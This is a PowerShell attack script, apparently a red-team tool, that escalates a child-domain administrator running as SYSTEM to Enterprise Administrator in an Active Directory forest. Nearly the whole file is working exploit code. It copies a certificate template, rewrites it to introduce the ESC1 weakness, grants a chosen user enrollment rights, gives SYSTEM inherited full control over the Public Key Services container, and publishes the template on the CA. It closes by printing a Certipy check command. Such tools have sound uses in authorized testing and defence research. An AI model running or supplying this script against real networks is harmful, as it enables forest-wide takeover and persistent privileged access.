<#

Domain Administrator to Enterprise Administrator
Child to Parent
Pew Pew
Author: Toby Jackson (heartburn)
License: BSD 3-Clause
Required Dependencies: None

#>

# Import AD module
Import-Module ActiveDirectory

function Is-SystemAccount {
    try {
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $isSystem = $currentUser.IsSystem

        if ($isSystem) {
            Write-Output "[+] You are SYSTEM. Continuing ..."
            return $true
        } else {
            Write-Output "[!] You are NOT SYSTEM. Stopping attack ..."
            return $false
            exit
        }
    } catch {
        Write-Error "An error occurred: $_"
        return $false
        exit
    }
}

function Modify-Template {
<#
.SYNOPSIS

Modifies a given template to add the ESC1 vulnerability.


.DESCRIPTION

Ensures that the ENROLLEE_SUPPLIES_SUBJECT flag is set to true.

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $ExistingTemplate,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $NewTemplateName,

       [Parameter(Position = 2, Mandatory=$true)]
       [String]
       $RootDomain,
       
       [Parameter(Position = 3, Mandatory=$true)]
       [String]
       $Tld
    )

    echo "[*] Making copy of template: $ExistingTemplate..."
    # Create a file name to store the copied user template in 
    $TemplateCopy = ((1..20 | %{ '{0:X}' -f (Get-Random -Max 16) }) -Join '') + ".ldf"
    echo "[*] Storing template copy in: $TemplateCopy"
    # Modified template with ESC1 added
    $OutTemplate = ((1..20 | %{ '{0:X}' -f (Get-Random -Max 16) }) -Join '') + ".ldf"
    echo "[*] Storing modified template in: $OutTemplate"

    # Copy current given template
    ldifde -m -v -d "CN=$ExistingTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$rootDomain,DC=$tld" -f $TemplateCopy


    # Add Enrolee supplies subject and modify certificate template - Doing this off a current template in the environment 
    # is safer than trying to write a pre-loaded template each time. I think anyway?
    # This also removes and necessity to use external modules to modify templates.
    # Fields to replace: 
    # dn: - We can just replace CN=TemplateName
    # cn: 
    # displayName:
    # distinguishedName: We can just replace CN=TemplateName
    # flags: 
    # msPKI-Certificate-Name-Flag:
    # msPKI-Enrollment-Flag:
    # name: 
    # pKIExtendedKeyUsage:
    # Maybe this could be handled with macro expansions in ldifde?
    
    # Replace the cn: entry
    $cnLine = Get-Content $TemplateCopy | Select-String "cn: "| Select-Object -ExpandProperty Line
    $newCnLine = "cn: $TemplateName"

    # Replace the displayNamer entry
    $displayNameLine = Get-Content $TemplateCopy | Select-String "displayName: "| Select-Object -ExpandProperty Line
    $newDisplayNameLine = "displayName: $TemplateName"

    # Modify the flags 
    $flagsLine = Get-Content $TemplateCopy | Select-String "flags: "| Select-Object -ExpandProperty Line
    $newFlagsLine = "flags: 131642"

    # Add the ESC1 value to allow specification of SAN
    $mspkiCertNameLine = Get-Content $TemplateCopy | Select-String "msPKI-Certificate-Name-Flag: "| Select-Object -ExpandProperty Line
    $newCertNameLine = "msPKI-Certificate-Name-Flag: 1"

    # Make sure manager approval is not set
    $mspkiEnrollmentLine = Get-Content $TemplateCopy | Select-String "msPKI-Enrollment-Flag: "| Select-Object -ExpandProperty Line
    $newEnrollmentLine = "msPKI-Enrollment-Flag: 9"

    # Modify the name: line
    $nameLine = Get-Content $TemplateCopy | Select-String -Pattern "^name: "| Select-Object -ExpandProperty Line
    $newNameLine = "name: $TemplateName"
                                                
    # Ensure it can be used for client authentication
    $pKIExtendedKeyUsageLine = Get-Content $TemplateCopy | Select-String "pKIExtendedKeyUsage"| Select-Object -ExpandProperty Line | select -Index 0
    $clientAuthExtendedKey = "pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2"

    (Get-Content $TemplateCopy | ? {$_ -ne ""}) | ForEach-Object {
        $_.replace("CN=$ExistingTemplate", "CN=$NewTemplateName").replace($cnLine, $newCnLine).replace($flagsLine, $newFlagsLine).replace($displayNameLine, $newDisplayNameLine).replace($mspkiCertNameLine, $newCertNameLine).replace($mspkiEnrollmentLine, $newEnrollmentLine).replace($nameLine, $newNameLine).replace($pKIExtendedKeyUsageLine, $clientAuthExtendedKey)#.replace("cn: $ExistingTemplate", "cn: $NewTemplateName")
    } | Set-Content $OutTemplate

    Add-Content -Path $OutTemplate "msPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2"
    Get-Content $OutTemplate | Select-Object -Unique | Set-Content $OutTemplate

    # Import certificate template
    ldifde -i -k -f $OutTemplate

    del $TemplateCopy
    del $OutTemplate
}

function Add-Dacl {
<#
.SYNOPSIS

Adds the "enroll" privileges to the provided template


.DESCRIPTION

This function adds the "enroll" privileges to the ESC1-vulnerable template.


.RETURNS 

# TODO: Add sanity check return

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $TemplateName,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $ChildDomain,

       [Parameter(Position = 2, Mandatory=$true)]
       [String]
       $Username
    )

    # https://www.sysadmins.lv/blog-en/get-certificate-template-effective-permissions-with-powershell.aspx
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Certificate Templates,CN=Public Key Services,CN=Services,$ConfigContext"
    $filter = "(cn=$TemplateName)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $Template = $ds.Findone().GetDirectoryEntry()
    # Create user object
    $objUser = New-Object System.Security.Principal.NTAccount("$ChildDomain\$Username")
    # Set Enroll GUID
    $objectGuid = New-Object Guid 0e10c968-78fb-11d2-90d4-00c04f79dc55
    # Set ExtendedRight attribute
    $ADRight = [System.DirectoryServices.ActiveDirectoryRights]"ExtendedRight"
    # Set Allow value of ACE
    $ACEType = [System.Security.AccessControl.AccessControlType]"Allow"
    # Add ACE
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $objUser, $ADRight, $ACEType, $objectGuid
    $Template.get_Options().SecurityMasks = [System.DirectoryServices.SecurityMasks]'Dacl'
    $Template.ObjectSecurity.AddAccessRule($ACE)
    $Template.commitchanges()
}

function Enable-Template {
<#
.SYNOPSIS

Enables the given template name


.DESCRIPTION

With the template imported into the template store, the correct DACL added, and the ESC1 vulnerability applied,
it just now needs to be "enabled". This can be done by modifying the CN=EnrollmentServices,CN=<CAName> object's properties
and adding the new template name to the "certificateTemplates" value


.PARAMETER TemplateName

The template name that should be enabled.


.PARAMETER CAName

The CA Name (Used for filtering AD objects).


.RETURNS 
# TODO: Add this logic
[Bool] $true / $false after checking enabled templates

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $TemplateName,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $CAName
    )

    # Enable the template
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigContext"
    $filter = "(cn=$CAName)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $CAObject = $ds.Findone().GetDirectoryEntry()
    # Update the value to contain the certificate template
    $CAObject.Properties['certificateTemplates'].Value += "$TemplateName"
    $CAObject.commitchanges()

    # Get the list of certificate templates after enabling it
    $TemplateList = $CAObject.Properties['certificateTemplates'].Value
    # Set a flag for a boolean positive return value
    $published = 0
    # Loop over the templates and check the template name now exists in the string value of the AD object
    foreach ($Template in $TemplateList) { 
        if ($Template -eq $TemplateName) {
            echo "[*] $TemplateName was successfully published!"
            $published = 1
            break
        }
    }
    if ($published -ne 1) {
        echo "[!] There was an issue enabling the template! Exiting..."
        sleep 5 
        exit
    }
}

function Modify-PublicKeyServicesContainer {
<#
.SYNOPSIS

Modifies the permissions on the CN=Public Key Services container to allow inheritance for the SYSTEM user in the child domain.


.DESCRIPTION

The Public Key Services container (CN=Public Key Services) grants the SYSTEM user in the child domain full access, but access to the 
underlying Enrollment Services container (CN=Enrollment Services), which specifically contains the pKIEnrollmentService
class, does not. However, since inheritence is allowed on the object, if we can modify the "This object only" to 
"This object and its descendants" then we'll have full control, and therefore be able to modify the container/enable templates!

.RETURNS 

TODO: Add checks

#>

    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Services,$ConfigContext"
    $filter = "(cn=Public Key Services)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $PKSObject = $ds.Findone().GetDirectoryEntry()
    # Create user object
    $objUser = New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")
    $AdRights = [System.DirectoryServices.ActiveDirectoryRights]"GenericAll"
    # Add the All inheritance to the container, granting control over the Enrollment Services container that is a child of Public Key Services
    $Scope = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
    # Set Allow value of ACE
    $ACEType = [System.Security.AccessControl.AccessControlType]"Allow"
    # Add ACE
    $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $objUser, $AdRights, $ACEType, $Scope
    $PKSObject.get_Options().SecurityMasks = [System.DirectoryServices.SecurityMasks]'Dacl'
    $PKSObject.ObjectSecurity.AddAccessRule($ACE)
    $PKSObject.commitchanges()
}

function Invoke-Escalation {
<#
.SYNOPSIS

Encompassing function to perform the exploit. This is the main function that you call to escalate to EA.


.DESCRIPTION

The function works in multiple stages:
- Identify if the SYSTEM user is running the script
- Lists available templates and copies one into a temporary .ldf file
- Modifies the copied template to be vulnerable to ESC1
- Imports the modified template to the certificate store - This gets propogated into the root certificate store
- Adds a DACL to the target user to allow them to enroll in the new template
- Modify the Public Key Services container to allow full control to SYSTEM plus its descendant objects
- Set the template to enabled to allow it to be requested by the specified user


.PARAMETER Username

The username that you wish to grant ESC1 abuse for. No need to pass the domain.


.PARAMETER TemplateName

The name of the template that will be added for ESC1 abuse.

.EXAMPLE

Invoke-Escalation -Username Heartburn -TemplateName SneakyTemplate


.RETURNS

[String] Certipy commands to check result of ESC1 addition for specific user

#>
    Param (
       [Parameter(Position = 0, Mandatory=$true)]
       [String]
       $Username,

       [Parameter(Position = 1, Mandatory=$true)]
       [String]
       $TemplateName
    )
    
    # Check whether we are running as SYSTEM
    Is-SystemAccount

    # Environment initialization
    $Tld =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-1]
    $RootDomain =  [System.Net.Dns]::GetHostEntry([string]$env:computername).HostName.Split('.')[-2]
    $ChildDomain = $env:USERDomain
    echo "[*] We are in running the exploit on user $ChildDomain\$Username which will propagate up to the $RootDomain.$Tld root domain!"

    
    # Get the current CA name
    $CAName = (Get-ADObject -Filter 'ObjectClass -eq "pKIEnrollmentService"' -SearchBase (Get-ADRootDSE).ConfigurationNamingContext).Name
    
    # Get a list of existing templates to find one to make a clone of
    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $ConfigContext = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigContext"
    $filter = "(cn=$CAName)"
    $ds = New-object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$ConfigContext",$filter)
    $PKSObject = $ds.Findone().GetDirectoryEntry()
    $TemplateList = $PKSObject.certificateTemplates
    # Check that there are templates found to make a copy from
    # TODO: Try to create a static template so we can continue in environments that have ADCS but no templates published?
    if ($TemplateList.count -lt 1) {
        echo "[!] No templates have been found to copy! Maybe there is none in use in the environment. Exiting..."
        sleep 5
        exit
    }
    # Loop over and regex out the template names
    foreach ($Template in $TemplateList) {
        if ($Template -eq "User") {  
            # I prefer using the user template as testing was done heavily with that, but now I'm re-writing the template line by line
            # rather than just modifying specific values, this shouldn't matter too much. Leaving in for redundancy 
            Modify-Template -ExistingTemplate "User" -NewTemplateName $TemplateName -Root $RootDomain -Tld $Tld
            break
        }
        # If we are at the last item in the list and haven't found User, we will use that template as a base to copy
        elseif ($Template -eq $TemplateList[-1]) {
            # If this is returning null, there's either no templates enabled, or my logic has broken somewhere...
            echo "[*] Modifying template name: $Template"
            Modify-Template -ExistingTemplate $Template -NewTemplateName $TemplateName -Root $RootDomain -Tld $Tld
            break
        }
    }        
    
    # Now we have modified the content of the template to make it vulnerable to ESC1, we need to add our target users' enrollment rights
    # Modify the template DACL to allow the low-privileged user "Enroll" rights for the template
    Add-Dacl -TemplateName $TemplateName -ChildDomain $ChildDomain -Username $Username

    # Before we enable the template, we need to provide the SYSTEM user with control over the CN=Public Key Services container
    # Otherwise, we cannot remotely enable a template, as the current permissions do not allow anything other than Enterprise Admin level
    # access to "publish" templates
    Modify-PublicKeyServicesContainer -TemplateName $TemplateName

    if (Enable-Template -TemplateName $TemplateName -CAName $CAName) {
        echo "[*] All done! User should now be able to exploit ESC1."
        echo "[*] Certipy command to check: certipy find -vulnerable -scheme ldap -u $Username -p <password> -dc-ip <DC-IP>"
    }
    else {
        echo "[!] Something went wrong when enabling the template!"
        exit
    }
}
